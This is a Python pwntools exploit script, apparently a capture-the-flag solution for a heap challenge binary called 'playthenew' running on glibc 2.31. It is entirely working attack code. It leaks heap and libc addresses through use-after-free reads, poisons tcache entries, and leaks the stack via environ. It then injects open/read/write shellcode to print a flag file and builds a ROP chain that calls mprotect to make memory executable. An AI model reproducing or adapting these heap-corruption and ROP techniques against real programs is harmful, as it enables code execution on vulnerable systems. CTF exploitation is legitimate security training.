#/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.arch = "amd64"
p = process('./playthenew')
# context.log_level = 'debug'
e = ELF('./playthenew')
l = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
def launch_gdb():
    os.system("gnome-terminal -- gdb -q ./playthenew " + str(proc.pidof(p)[0]))

def add(idx, size, name):
    p.sendlineafter('> ',str(1))
    p.sendlineafter('index:',str(idx))
    p.sendlineafter('ball:',str(size))
    p.sendafter('name:',name)

def delete(idx):
    p.sendlineafter('> ',str(2))
    p.sendlineafter('ball:',str(idx))

def show(idx):
    p.sendlineafter('> ',str(3))
    p.sendlineafter('ball:',str(idx))
    p.recvuntil('dance:')

def edit(idx, name):
    p.sendlineafter('> ',str(4))
    p.sendlineafter('ball:', str(idx))
    p.sendafter('ball:', name)

def secret(cnt):
    p.sendlineafter('> ',str(5))
    p.sendafter('place:', cnt)

def backdoor():
    p.sendlineafter('> ',str(0x666))

for _ in range(5):
    add(0,0x160,'a')
    delete(0)
add(0,0x88,'a')
delete(0)
add(0,0x88,'a')
delete(0)
show(0)
heap = u64(p.recvuntil(b'\n',drop=True).ljust(0x8,b'\x00'))-0x2a0 
log.info('h.address:'+hex(heap))
for _ in range(5):
    add(0,0x88,'a')
    delete(0)
add(0,0x88,'a')
add(1,0x88,'a')
delete(0)
show(0)
leak_libc = u64(p.recvuntil(b'\n',drop=True).ljust(0x8,b'\x00')) - 2014176
log.info('libc ' + hex(leak_libc))
# raw_input()
for _ in range(7):
    add(0,0xa0,'a')
    delete(0)
    add(1,0xb0,'a')
    delete(1)
    add(0,0xc0,'a')
    delete(0)
    add(1,0x90,'a')
    delete(1)
add(0,0xa0,'a')
add(1,0xb0,'a')
add(2,0xb0,'a')
add(2,0xa0,'a')
add(3,0xb0,'a')
add(4,0x90,'a')
add(4,0x90,'a')
delete(1)
delete(3)
add(1,0xc0,'a')
add(3,0xc0,'a')
delete(0)
delete(2)
delete(4)
delete(1)
add(3,0x200,'a')
edit(4,p64(heap + 7664) + p64(0x100000-0x10))
add(1,0x160,'a')
secret(p64(0) + p64(l.symbols['puts'] + leak_libc) + p64(l.symbols['environ'] + leak_libc))
backdoor()

leak_stack = u64(p.recvuntil(b'\n',drop=True).ljust(0x8,b'\x00'))
log.info('leak stack :' + hex(leak_stack)) # 288

shellcode = shellcraft.amd64.open('flag',0) + shellcraft.amd64.read('rax',0x100000,0x20) + \
    shellcraft.amd64.write(1,0x100000,0x20)

secret(p64(0) + p64(l.symbols['gets'] + leak_libc) + p64(leak_stack-288) + \
    b'\x90'*0x30 + asm(shellcode))
backdoor()
'''
0x0000000000026b72 : pop rdi ; ret
0x00000000001626d5 : pop rax ; pop rdx ; pop rbx ; ret
0x0000000000027529 : pop rsi ; ret
'''
rop = p64(0x00000000001626d5 + leak_libc) + p64(0) + p64(7) + p64(0)
rop += p64(0x0000000000026b72 + leak_libc) + p64(0x100000)
rop += p64(0x0000000000027529 + leak_libc) + p64(0x1000)
rop += p64(leak_libc + l.symbols['mprotect'])
rop += p64(0x100020)

p.sendline(rop)
p.interactive()